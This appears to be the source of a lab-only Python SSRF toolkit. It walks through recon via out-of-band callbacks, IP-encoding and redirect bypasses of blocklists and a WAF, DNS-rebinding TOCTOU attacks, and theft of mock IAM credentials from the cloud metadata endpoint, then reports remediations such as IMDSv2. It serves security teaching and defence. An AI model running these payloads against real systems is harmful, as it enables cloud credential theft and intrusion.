#!/usr/bin/env python3
"""
ssrfkit — unified SSRF toolkit for the SSRF Lab, mapped to the Cyber Kill Chain
================================================================================
⚠️  LAB-ONLY. Point this ONLY at the lab's own services. Using these techniques
against systems you do not own or lack written permission to test is illegal.
See ../SECURITY.md.

This is one entrypoint that REUSES the existing toolkit modules (no duplication):
  - ssrf_payloads.build_urls   -> alternate IP-encoding payloads
  - ssrf_scan.probe/payloads   -> firing payloads at the app and classifying
  - imds_check.probe_v1/v2     -> IMDSv1 vs IMDSv2 audit
  - oob-listener (lab service) -> confirming BLIND SSRF out-of-band

Subcommands follow the kill chain:
  recon      Reconnaissance    detect SSRF, incl. blind SSRF via an OOB callback
  weaponize  Weaponization     craft the bypass payloads
  exploit    Exploitation      fire payloads at the app, with and without the WAF
  loot       Actions on Obj.   exfiltrate the (fake) IAM credentials via SSRF
  audit      (defensive)       check whether metadata enforces IMDSv1 or IMDSv2
  full       run recon -> weaponize -> exploit -> loot as a guided demo

Designed to run INSIDE the lab network (so it can reach the internal services),
e.g. from the repo root with the lab running:

    docker run --rm --network ssrf-lab_ssrflab -v "${PWD}/toolkit:/t" \
        python:3.12-slim python /t/ssrfkit.py full
"""
from __future__ import annotations

import argparse
import datetime
import html as htmllib
import json
import os
import re
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request

# Reuse the existing toolkit modules (they live next to this file).
from ssrf_payloads import build_urls
from ssrf_scan import CREDS_PATH, classify, payloads, probe
import imds_check

DEFAULTS = {
    "app": "http://vulnerable-app:5000",   # the vulnerable app, inside the lab
    "waf": "http://waf:8080",              # same app via the WAF edge
    "oob": "http://oob-listener.lab",      # OOB callback collector
    "metadata": "http://169.254.169.254",  # mock metadata base
    "metadata_ip": "169.254.169.254",
    "dns": "http://dns-rebind.lab",        # rebinding DNS control API
    "rebind_host": "rebind.lab",           # the rebinding hostname
}

_USE_COLOR = sys.stdout.isatty()
_PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)
_BLOCK_RE = re.compile(r'<div class="blocked">.*?</b>\s*(.*?)</div>', re.S)


def _c(text, code):
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text


def _stage(title, subtitle):
    bar = "=" * 70
    print("\n" + _c(bar, "36"))
    print(_c(f"  {title}", "1;36") + _c(f"   {subtitle}", "36"))
    print(_c(bar, "36"))


def _get(url, timeout=8):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001 — report transport errors compactly
        return None, f"{type(exc).__name__}: {exc}"


def _app_fetch_url(app_base, level, target):
    query = urllib.parse.urlencode({"level": level, "url": target})
    return f"{app_base}/fetch?{query}"


def _extract_pre(html_text):
    match = _PRE_RE.search(html_text or "")
    return htmllib.unescape(match.group(1)).strip() if match else ""


def _extract_block(html_text):
    match = _BLOCK_RE.search(html_text or "")
    return htmllib.unescape(match.group(1)).strip() if match else ""


# --------------------------------------------------------------------------- #
#  Subcommands                                                                 #
# --------------------------------------------------------------------------- #

def cmd_recon(args):
    _stage("RECON", "detect SSRF — including BLIND SSRF via an out-of-band callback")
    token = "ssrfkit-" + uuid.uuid4().hex[:12]
    callback = f"{args.oob}/cb/{token}"
    print(f"Unique token : {token}")
    print(f"Make the app (L{args.level}) fetch our OOB callback:\n  {callback}")

    _get(_app_fetch_url(args.app, args.level, callback))
    time.sleep(0.6)  # give the callback a moment to arrive

    status, body = _get(f"{args.oob}/seen/{token}")
    confirmed = False
    try:
        confirmed = bool(json.loads(body).get("seen"))
    except Exception:  # noqa: BLE001
        pass

    if confirmed:
        print(_c("  [+] OOB callback RECEIVED — blind SSRF CONFIRMED.", "1;32"))
        print("      The app made an outbound request to our listener, proving")
        print("      SSRF even without reading any response body.")
    else:
        print(_c(f"  [-] No callback seen (listener said: {body.strip()}).", "1;31"))
    return confirmed


def cmd_weaponize(args):
    _stage("WEAPONIZE", "craft bypass payloads for the target metadata IP")
    urls = build_urls(args.metadata_ip, CREDS_PATH)
    width = max(len(name) for name in urls)
    for name, url in urls.items():
        print(f"  {name.ljust(width)}  {url}")
    print("\n  (decimal/hex/octal forms defeat a naive string blocklist; a filter")
    print("   that decodes to the real IP, or resolves+pins it, stops them.)")
    return urls


def cmd_exploit(args):
    _stage("EXPLOIT", "fire payloads at the app — without the WAF vs through it")
    tests = payloads(args.metadata_ip)
    width = max(len(name) for name, _ in tests)
    print("  " + "payload".ljust(width) + "  " + "no-WAF".ljust(10) + "via-WAF")
    print("  " + "-" * (width + 20))
    for name, url in tests:
        direct = probe(args.app, args.level, url)
        viawaf = probe(args.waf, args.level, url)
        print("  " + name.ljust(width) + "  " + direct.ljust(10) + viawaf)
    print("\n  LOOT = fake creds · BLOCKED = app filter · WAF-403 = WAF refused ·"
          " FETCHED = non-creds · REQ-ERR = transport")


def cmd_loot(args):
    _stage("LOOT", "exfiltrate the (fake) IAM credentials via SSRF")
    target = f"{args.metadata}/latest/meta-data/iam/security-credentials/lab-ec2-demo-role"
    print(f"  SSRF target (L{args.level}): {target}")
    _status, html_body = _get(_app_fetch_url(args.app, args.level, target))
    verdict = classify(html_body) if html_body else "REQ-ERR"
    pre = _extract_pre(html_body)

    if verdict == "LOOT":
        print(_c("  [+] CREDENTIALS EXFILTRATED:", "1;32"))
        for line in pre.splitlines():
            print("      " + line)
    elif verdict == "BLOCKED":
        print(_c("  [-] Blocked by the app filter (L1-L3 defense active).", "1;33"))
        print("      " + pre.splitlines()[0] if pre else "")
    else:
        # e.g. the metadata returned 401 because IMDSv2 is enforced.
        print(_c("  [-] No credentials returned.", "1;33"))
        if pre:
            print("      endpoint said: " + pre.splitlines()[0])
        print("      (expected when IMDSv2 is enforced: a bare SSRF GET cannot do"
              " the PUT-token dance.)")


def cmd_audit(args):
    _stage("AUDIT", "defensive — does the metadata endpoint enforce IMDSv1 or IMDSv2?")
    v1_status, _v1_body, v1_leaked = imds_check.probe_v1(args.metadata)
    print(f"  IMDSv1 plain GET -> status {v1_status}, creds leaked: {v1_leaked}")
    tok_status, token, v2_get, v2_leaked = imds_check.probe_v2(args.metadata)
    got = v2_get[0] if v2_get else None
    print(f"  IMDSv2 token flow -> PUT {tok_status}"
          + (f", token={token[:10]}..." if token else "")
          + (f", GET {got}, creds: {v2_leaked}" if v2_get else ""))
    if v1_leaked:
        print(_c("  => IMDSv1 behaviour: a bare GET leaks creds. VULNERABLE to basic SSRF.", "1;31"))
    elif v1_status in (401, 403) and v2_leaked:
        print(_c("  => IMDSv2 ENFORCED: bare GET denied; only the token flow works.", "1;32"))
    else:
        print("  => inconclusive (see above).")


def cmd_rebind(args):
    _stage("REBIND", "DNS rebinding — defeats check-then-use (L2.5), but not L3")
    target = f"http://{args.rebind_host}/latest/meta-data/iam/security-credentials/lab-ec2-demo-role"
    _get(f"{args.dns}/reset")
    print(f"Rebinding host: {target}")
    print("DNS returns a SAFE ip on query #1, then the INTERNAL ip on query #2+.\n")

    # 1) The TOCTOU-vulnerable level: validate (safe) then re-resolve at connect (internal).
    _s, html = _get(_app_fetch_url(args.app, 25, target))
    v_toctou = classify(html) if html else "REQ-ERR"
    pre = _extract_pre(html)
    print("L2.5 (check-then-use):")
    if v_toctou == "LOOT":
        key = re.search(r'"AccessKeyId":\s*"([^"]+)"', pre)
        print(_c(f"  [+] LOOT via rebind — AccessKeyId={key.group(1) if key else '?'}", "1;32"))
    else:
        print(_c(f"  [{v_toctou}] {pre.splitlines()[0] if pre else ''}", "1;33"))
    print("  DNS flip seen:")
    for line in _get(f"{args.dns}/log")[1].strip().splitlines():
        print("    " + line)

    # 2) The correct level: resolve once and pin — never re-resolves.
    _s2, html2 = _get(_app_fetch_url(args.app, 3, target))
    v_l3 = classify(html2) if html2 else "REQ-ERR"
    pre2 = _extract_pre(html2)
    print("\nL3 (resolve-then-pin):")
    if v_l3 == "BLOCKED":
        print(_c(f"  [+] BLOCKED — {_extract_block(html2)}", "1;32"))
    elif v_l3 == "LOOT":
        print(_c("  [-] LOOT — unexpected, L3 should pin!", "1;31"))
    else:
        print(f"  [{v_l3}] {pre2.splitlines()[0] if pre2 else ''}")

    print("\n  " + "level".ljust(24) + "result vs the rebind attack")
    print("  " + "-" * 46)
    print("  " + "L2.5 check-then-use".ljust(24) + v_toctou)
    print("  " + "L3 resolve-then-pin".ljust(24) + v_l3)
    print("\n  TTL-0 rebinding beats any filter that re-resolves at connect; L3 resolves")
    print("  once and pins the IP, so it cannot be rebound. Cf. CVE-2024-24759 (MindsDB).")


def _report_gather(args):
    """Run every check live and return the real data the report is built from."""
    tests = payloads(args.metadata_ip)
    matrix = {name: {lvl: probe(args.app, lvl, url) for lvl in (0, 1, 2, 3)}
              for name, url in tests}
    waf = {name: {"direct": probe(args.app, 0, url), "waf": probe(args.waf, 0, url)}
           for name, url in tests}

    v1_status, _b, v1_leaked = imds_check.probe_v1(args.metadata)
    _toks, _tok, v2_get, v2_leaked = imds_check.probe_v2(args.metadata)

    _get(f"{args.dns}/reset")
    rb_target = f"http://{args.rebind_host}{CREDS_PATH}"
    _s1, h1 = _get(_app_fetch_url(args.app, 25, rb_target))
    rb_toctou = classify(h1) if h1 else "REQ-ERR"
    _slog, rb_log = _get(f"{args.dns}/log")
    _s2, h2 = _get(_app_fetch_url(args.app, 3, rb_target))
    rb_l3 = classify(h2) if h2 else "REQ-ERR"

    _sl, hl = _get(_app_fetch_url(args.app, 0, args.metadata + CREDS_PATH))
    key_m = re.search(r'"AccessKeyId":\s*"([^"]+)"', _extract_pre(hl))

    return {
        "when": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "matrix": matrix, "waf": waf,
        "imds": {"v1_status": v1_status, "v1_leaked": v1_leaked,
                 "v2_status": (v2_get[0] if v2_get else None), "v2_leaked": v2_leaked},
        "rebind": {"toctou": rb_toctou, "l3": rb_l3,
                   "log": [x for x in (rb_log or "").splitlines() if x.strip()]},
        "loot_key": key_m.group(1) if key_m else "",
    }


def _report_findings(d):
    m, waf, imds, rb = d["matrix"], d["waf"], d["imds"], d["rebind"]
    f = []
    if m.get("dotted-decimal", {}).get(0) == "LOOT":
        f.append(("SSRF to cloud metadata → IAM credential theft", "Critical",
                  "Actions on Objectives", "ATT&CK T1552.005 · CWE-918",
                  f"At L0 a GET of the metadata credentials endpoint returned IAM "
                  f"credentials (AccessKeyId={d['loot_key'] or 'ASIA…EXAMPLE'}).",
                  "Resolve-then-pin the connected IP (L3); enforce IMDSv2; restrict "
                  "egress; scope the instance role to least privilege."))
    if m.get("decimal-integer", {}).get(1) == "LOOT":
        f.append(("Blocklist bypass via alternate IP encodings", "High",
                  "Delivery", "CWE-918",
                  "At L1 the decimal/hex/octal IP forms bypassed the string blocklist → LOOT.",
                  "Never blocklist URL strings; canonicalize and validate the resolved IP (L2/L3)."))
    if m.get("dns-innocent", {}).get(2) == "LOOT" or m.get("302-redirect", {}).get(2) == "LOOT":
        f.append(("Parser bypass via DNS name / 302 redirect", "High",
                  "Delivery", "CWE-918",
                  "At L2 an innocent-looking hostname and a 302 redirect reached the internal target → LOOT.",
                  "Resolve-then-pin and re-validate every redirect hop (L3)."))
    if rb["toctou"] == "LOOT" and rb["l3"] == "BLOCKED":
        f.append(("DNS rebinding defeats check-then-use (TOCTOU)", "High",
                  "Delivery", "ATT&CK T1552.005 · CWE-918",
                  f"L2.5 (check-then-use) leaked creds via the TTL-0 flip ({' / '.join(rb['log'][:2])}); "
                  "L3 resolve-then-pin BLOCKED the same request.",
                  "Connect to the validated IP; never re-resolve the hostname at connect."))
    if waf.get("dotted-decimal", {}).get("waf") == "WAF-403" and (
            waf.get("dns-innocent", {}).get("waf") == "LOOT"
            or waf.get("302-redirect", {}).get("waf") == "LOOT"):
        f.append(("WAF bypass via hostname / redirect", "Medium",
                  "Defense Evasion", "CWE-918",
                  "The WAF (ModSecurity/CRS) 403s IP-literal payloads but passes a benign "
                  "hostname/redirect, which still reaches the metadata endpoint — the Capital One pattern.",
                  "Treat the WAF as one layer only; fix at the application (L3) and platform (IMDSv2)."))
    if imds["v1_leaked"]:
        f.append(("IMDSv1 enabled (metadata needs no token)", "High",
                  "Credential Access", "ATT&CK T1552.005",
                  "A plain GET to the metadata credentials endpoint succeeds without a token.",
                  "Enforce IMDSv2 (HttpTokens=required); audit with ec2-imdsv2-check."))
    return f


def _report_positives(d):
    m, imds, rb = d["matrix"], d["imds"], d["rebind"]
    pos = []
    if all(m.get(k, {}).get(3) == "BLOCKED" for k in ("dotted-decimal", "decimal-integer", "dns-innocent", "302-redirect")):
        pos.append("L3 (resolve-then-pin + redirect revalidation) blocked every internal payload.")
    if rb["l3"] == "BLOCKED":
        pos.append("L3 blocked the DNS-rebinding attack that defeated the check-then-use level.")
    if (not imds["v1_leaked"]) and imds["v2_leaked"]:
        pos.append("IMDSv2 denied the bare-GET SSRF (401); only the PUT-token flow worked.")
    return pos


def _render_md(d):
    f = _report_findings(d)
    pos = _report_positives(d)
    L = ["# SSRF Lab — Penetration Test Scorecard", "",
         f"_Generated {d['when']} · **LAB-ONLY — all credentials are fake, no real system was tested.**_", "",
         "## Executive summary", "",
         f"A controlled SSRF lab was assessed end-to-end. **{len(f)} findings** were "
         "confirmed with live evidence. Without application-layer validation the server "
         "can be driven to the cloud metadata endpoint and leak IAM credentials; naive "
         "filters and a WAF were each bypassed. The attack was stopped only by correct "
         "app logic (resolve-then-pin) and platform hardening (IMDSv2).", "",
         "## Findings", "",
         "| # | Finding | Severity | Kill chain | Mapping |",
         "|---|---------|----------|-----------|---------|"]
    for i, (title, sev, kc, mp, _ev, _rem) in enumerate(f, 1):
        L.append(f"| {i} | {title} | {sev} | {kc} | {mp} |")
    L += ["", "### Detail & remediation", ""]
    for i, (title, sev, _kc, _mp, ev, rem) in enumerate(f, 1):
        L += [f"**{i}. {title}** — _{sev}_", "", f"- Evidence: {ev}", f"- Remediation: {rem}", ""]
    L += ["## Defenses verified effective", ""]
    L += [f"- ✅ {p}" for p in pos] or ["- (none)"]
    L += ["", "## Scorecard — defense level vs payload (live)", "",
          "| payload | L0 | L1 | L2 | L3 | via-WAF |",
          "|---------|----|----|----|----|---------|"]
    for name in d["matrix"]:
        c = d["matrix"][name]
        L.append(f"| {name} | {c[0]} | {c[1]} | {c[2]} | {c[3]} | {d['waf'][name]['waf']} |")
    L += ["", f"IMDS: v1 GET status {d['imds']['v1_status']} (creds leaked: {d['imds']['v1_leaked']}).",
          "", "_LOOT = credentials stolen · BLOCKED = app filter · WAF-403 = WAF refused._"]
    return "\n".join(L)


def _render_html(d):
    f = _report_findings(d)
    pos = _report_positives(d)
    sevc = {"Critical": "#f87171", "High": "#fb923c", "Medium": "#fbbf24", "Low": "#38bdf8"}
    vc = {"LOOT": "#f87171", "BLOCKED": "#34d399", "WAF-403": "#34d399",
          "FETCHED": "#38bdf8", "ERROR": "#8da2bd", "REQ-ERR": "#8da2bd"}

    def badge(sev):
        return f'<span style="background:{sevc.get(sev,"#888")};color:#07121f;font-weight:700;padding:2px 8px;border-radius:999px;font-size:12px">{sev}</span>'

    rows = "".join(
        f'<tr><td>{i}</td><td>{htmllib.escape(t)}</td><td>{badge(s)}</td><td>{kc}</td><td>{mp}</td></tr>'
        for i, (t, s, kc, mp, _e, _r) in enumerate(f, 1))
    detail = "".join(
        f'<div class="fd"><h4>{i}. {htmllib.escape(t)} {badge(s)}</h4>'
        f'<p><b>Evidence:</b> {htmllib.escape(e)}</p><p><b>Remediation:</b> {htmllib.escape(r)}</p></div>'
        for i, (t, s, _kc, _mp, e, r) in enumerate(f, 1))
    posli = "".join(f"<li>✅ {htmllib.escape(p)}</li>" for p in pos) or "<li>(none)</li>"

    def vcell(v):
        return f'<td style="background:{vc.get(v,"#333")}22;color:{vc.get(v,"#ccc")};font-weight:700">{v}</td>'
    score = "".join(
        f'<tr><td class="pl">{n}</td>' + "".join(vcell(d["matrix"][n][l]) for l in (0, 1, 2, 3))
        + vcell(d["waf"][n]["waf"]) + "</tr>" for n in d["matrix"])

    return f"""<!doctype html><html><head><meta charset="utf-8">
<title>SSRF Lab — Pentest Scorecard</title><style>
body{{background:#0a0f1a;color:#dbe4f0;font-family:"Segoe UI",system-ui,sans-serif;max-width:900px;margin:auto;padding:28px}}
h1{{margin:0}}.badge{{background:#fbbf24;color:#0a0f1a;font-weight:700;font-size:11px;padding:4px 10px;border-radius:999px}}
h2{{border-bottom:1px solid #243147;padding-bottom:6px;margin-top:28px}}
table{{border-collapse:collapse;width:100%;font-size:13px;margin-top:8px}}
th,td{{border:1px solid #243147;padding:6px 9px;text-align:center}}th{{color:#8da2bd}}.pl{{text-align:left}}
.fd{{background:#111a2b;border:1px solid #243147;border-radius:10px;padding:12px 14px;margin:10px 0}}
.fd h4{{margin:0 0 6px}} .muted{{color:#8da2bd}}
</style></head><body>
<span class="badge">⚠ LAB-ONLY · all credentials are fake · no real system tested</span>
<h1>🛡️ SSRF Lab — Penetration Test Scorecard</h1>
<p class="muted">Generated {d['when']} · evidence from live runs against the lab's own services.</p>
<h2>Executive summary</h2>
<p>{len(f)} findings were confirmed with live evidence. Without application-layer
validation the server reaches the cloud metadata endpoint and leaks IAM credentials;
naive filters and the WAF were each bypassed. The attack was stopped only by correct
app logic (resolve-then-pin, L3) and platform hardening (IMDSv2).</p>
<h2>Findings</h2>
<table><tr><th>#</th><th>Finding</th><th>Severity</th><th>Kill chain</th><th>Mapping</th></tr>{rows}</table>
<h2>Detail &amp; remediation</h2>{detail}
<h2>Defenses verified effective</h2><ul>{posli}</ul>
<h2>Scorecard — defense level vs payload (live)</h2>
<table><tr><th class="pl">payload</th><th>L0</th><th>L1</th><th>L2</th><th>L3</th><th>via-WAF</th></tr>{score}</table>
<p class="muted">IMDS: v1 GET status {d['imds']['v1_status']} (creds leaked: {d['imds']['v1_leaked']}).
LOOT = credentials stolen · BLOCKED = app filter · WAF-403 = WAF refused.</p>
</body></html>"""


def cmd_report(args):
    _stage("REPORT", "generate a pentest scorecard from live lab data")
    data = _report_gather(args)
    os.makedirs(args.out, exist_ok=True)
    md_path = os.path.join(args.out, "report.md")
    html_path = os.path.join(args.out, "report.html")
    with open(md_path, "w", encoding="utf-8") as fh:
        fh.write(_render_md(data))
    with open(html_path, "w", encoding="utf-8") as fh:
        fh.write(_render_html(data))
    n = len(_report_findings(data))
    print(_c(f"  [+] Report written: {n} findings", "1;32"))
    print(f"      {md_path}")
    print(f"      {html_path}")


def cmd_full(args):
    print(_c("\n  SSRFKIT — full kill-chain demo (LAB-ONLY)", "1;35"))
    print("  Reconnaissance -> Weaponization -> Exploitation -> Actions on Objectives")
    cmd_recon(args)
    cmd_weaponize(args)
    cmd_exploit(args)
    cmd_loot(args)
    _stage("DONE", "that is the full chain: find it, craft it, fire it, loot it")
    print("  Defensive takeaways live in the other levels: app L3 (resolve-then-pin),")
    print("  the WAF layer, and IMDSv2 — run 'ssrfkit audit' and compare levels.")


# --------------------------------------------------------------------------- #
#  Interactive menu (a friendly front-end that reuses the cmd_* functions)      #
# --------------------------------------------------------------------------- #

def _menu_args():
    """Build an args Namespace with the same defaults the subcommands use."""
    return argparse.Namespace(
        app=DEFAULTS["app"], waf=DEFAULTS["waf"], oob=DEFAULTS["oob"],
        metadata=DEFAULTS["metadata"], metadata_ip=DEFAULTS["metadata_ip"],
        dns=DEFAULTS["dns"], rebind_host=DEFAULTS["rebind_host"],
        level=0, out="reports", no_color=False)


def run_menu():
    items = [
        ("1", "Recon", "detect SSRF (incl. blind/OOB)", cmd_recon, None),
        ("2", "Weaponize", "generate bypass payloads", cmd_weaponize, None),
        ("3", "Exploit", "fire payloads (with/without WAF)", cmd_exploit, "level"),
        ("4", "Loot", "grab the IAM credentials", cmd_loot, "level"),
        ("5", "Audit", "IMDSv1 vs IMDSv2", cmd_audit, None),
        ("6", "Rebind", "DNS rebinding (L2.5 vs L3)", cmd_rebind, None),
        ("7", "Full", "full kill chain", cmd_full, None),
        ("8", "Report", "generate pentest scorecard", cmd_report, "out"),
    ]
    while True:
        print(_c("\n=== SSRFKIT — SSRF kill-chain toolkit (LAB-ONLY) ===", "1;36"))
        for key, name, desc, _f, _o in items:
            print(f"  {key}) {name:<10} — {desc}")
        print("  0) Exit")
        try:
            choice = input(_c("Choice > ", "1;36")).strip()
        except EOFError:
            print()
            return
        if choice == "0":
            print("bye.")
            return
        match = next((it for it in items if it[0] == choice), None)
        if not match:
            print(_c("  invalid choice — pick a number 0-8.", "1;33"))
            continue
        _k, _n, _d, func, opt = match
        args = _menu_args()
        try:
            if opt == "level":
                raw = input("  Defense level 0-3 [0]: ").strip()
                args.level = int(raw) if raw in ("0", "1", "2", "3") else 0
            elif opt == "out":
                default_out = "/out" if os.path.isdir("/out") else "reports"
                raw = input(f"  Output dir [{default_out}]: ").strip()
                args.out = raw or default_out
            func(args)
        except EOFError:
            print()
            return
        except KeyboardInterrupt:
            print("\n  cancelled.")
        except Exception as exc:  # noqa: BLE001 — never crash the menu
            print(_c(f"  error: {type(exc).__name__}: {exc}", "1;31"))
        try:
            input(_c("\n  [enter] back to menu ", "90"))
        except EOFError:
            print()
            return


# --------------------------------------------------------------------------- #
#  CLI                                                                          #
# --------------------------------------------------------------------------- #

def build_parser():
    parser = argparse.ArgumentParser(
        prog="ssrfkit",
        description="Unified SSRF toolkit (LAB-ONLY), mapped to the Cyber Kill Chain.")
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--app", default=DEFAULTS["app"], help="vulnerable app base URL")
    common.add_argument("--waf", default=DEFAULTS["waf"], help="app-via-WAF base URL")
    common.add_argument("--oob", default=DEFAULTS["oob"], help="OOB listener base URL")
    common.add_argument("--metadata", default=DEFAULTS["metadata"], help="metadata base URL")
    common.add_argument("--metadata-ip", default=DEFAULTS["metadata_ip"], help="metadata IP")
    common.add_argument("--dns", default=DEFAULTS["dns"], help="rebinding DNS control API URL")
    common.add_argument("--rebind-host", default=DEFAULTS["rebind_host"], help="rebinding hostname")
    common.add_argument("--out", default="reports", help="output dir for 'report'")
    common.add_argument("--level", type=int, default=0, choices=[0, 1, 2, 3],
                        help="defense level to use (default 0)")
    common.add_argument("--no-color", action="store_true", help="disable coloured output")

    sub = parser.add_subparsers(dest="command", required=True)
    for name, func, help_text in [
        ("recon", cmd_recon, "detect SSRF, incl. blind via OOB callback"),
        ("weaponize", cmd_weaponize, "craft bypass payloads"),
        ("exploit", cmd_exploit, "fire payloads at the app (with/without WAF)"),
        ("loot", cmd_loot, "exfiltrate the fake IAM credentials"),
        ("audit", cmd_audit, "check IMDSv1 vs IMDSv2 enforcement"),
        ("rebind", cmd_rebind, "DNS rebinding: TOCTOU bypass (L2.5) vs L3"),
        ("report", cmd_report, "generate a pentest scorecard (HTML + Markdown)"),
        ("full", cmd_full, "run the full kill-chain demo"),
    ]:
        sp = sub.add_parser(name, parents=[common], help=help_text)
        sp.set_defaults(func=func)
    return parser


def main():
    global _USE_COLOR
    argv = sys.argv[1:]
    # No arguments (or "menu") opens the interactive menu; everything else keeps
    # working exactly as before (scripting / the existing demo commands).
    if not argv or argv[0] == "menu":
        run_menu()
        return
    args = build_parser().parse_args(argv)
    if args.no_color:
        _USE_COLOR = False
    args.func(args)


if __name__ == "__main__":
    main()
